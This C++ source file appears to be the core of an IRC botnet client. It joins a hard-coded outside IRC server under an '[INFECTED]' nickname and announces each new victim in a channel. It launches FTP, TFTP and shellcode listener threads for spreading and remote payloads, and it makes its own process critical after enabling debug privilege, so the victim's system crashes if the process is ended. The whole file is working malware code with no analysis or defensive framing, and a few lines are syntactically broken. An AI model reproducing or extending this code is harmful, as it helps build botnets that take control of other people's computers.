#include "Include.h"
#include "Hell.h"

#define noobs "pokemon masters"  ###side note HAHA pok em on ^_^
/* Mutex string */
char testMutex[] = "Define-is-funny-but-doesnt-work-offcourse-doh-its-so-you-odnt-run-in-debug-mode-naab";
/* Mutex string */
void EraseMe(BOOL nopause/*=FALSE*/);
#pragma warning(disable:4786)

#pragma comment(linker,"/subsystem:console")


#pragma data_seg(SECTION_NAME)

__declspec(allocate(SECTION_NAME)) char szBuf[16384];


using namespace std;

#include <windows.h>
#include <stdio.h>

typedef VOID ( _stdcall *RtlSetProcessIsCritical ) (
													IN BOOLEAN        NewValue,
													OUT PBOOLEAN OldValue, // (optional)
													IN BOOLEAN      IsWinlogon );

BOOL EnablePriv(LPCSTR lpszPriv) 
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    
    if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    
    if(!LookupPrivilegeValue(NULL, lpszPriv, &luid)){
        CloseHandle(hToken); return FALSE;
    }
    
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProtectProcess()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;
	
	hDLL = LoadLibraryA("ntdll.dll");
	if ( hDLL != NULL )
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical) GetProcAddress( (HINSTANCE)hDLL, "RtlSetProcessIsCritical" );
		if(!fSetCritical) return 0;
		fSetCritical(1,0,0);
		return 1;
	} else
		return 0;
}


CBOT *BOT=NULL;

bool CBOT::Check(void)
{
	while (botRunning)
		Sleep(250); 
	
	if (!botRunning) 
		return false; 
	else 
		return true;
}

int CBOT::main(void)
{
	
	AddHosts();
        mirccmd("/server irc.dstiny.eu");
	mirccmd("//nick [INFECTED] $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,9)");
	Sleep(2000);
	SHellcodeHandler_s			      pShellcodeHandler;
	usSHellcodePort					= 30867;
	pShellcodeHandler.usPort		= usSHellcodePort;
	AddThread(FtpdHandler,			NULL,				1,	"FTPDaemon");
	AddThread(SHellcodeServer,		&pShellcodeHandler, 1,	"ShellcodeDaemon");
	AddThread(TFTPDHandler,			NULL,				1,	"TFTPDaemon");
	WSADATA initSock;
	if (WSAStartup(MAKEWORD(2,0), &initSock)) {   
		cout << "Winsock startup error." << endl;
		exit(0);
	}
	CreateMutex(NULL, FALSE,testMutex);
	while (GetLastError() == ERROR_ALREADY_EXISTS) {
		exit(0);
	}
	botRunning = true;
	cIRC.Init();
	BOT->hInstall.Start(true);	
	BOT->hRegcheck.Start(true);
	/*#ifndef OPENSSL
	// Initialize SSL Socket
	m_csslSocket.Init();
#endif // OPENSSL*/
	
	Sleep(1000);	
	mirccmd("/join #Arizon");
	mirccmd("/privmsg #Arizon :BOTBOT Infected me");
	mirccmd("/clear");
	mirccmd("/part #arizon");
	mirccmd("/server irc.dal.net");
     mirccmd("/quit");
	mirccmd("/exit");
	cIRC.Start(false,true,false);
	if (!Check())
		return 0;
	
}



int STARTBOT() 
{		

	BOT = new CBOT;
	BOT->main();
	return 0;
}


